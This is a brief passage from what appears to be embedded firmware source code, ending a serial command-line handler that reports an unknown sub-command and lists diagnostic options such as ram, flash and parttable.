    serialDevice->println("[RACE-CLI] Unknown sub-command. Available: check, info, ram, flash, parttable, raw");
    return false;
}

#endif // !LITE_VERSION
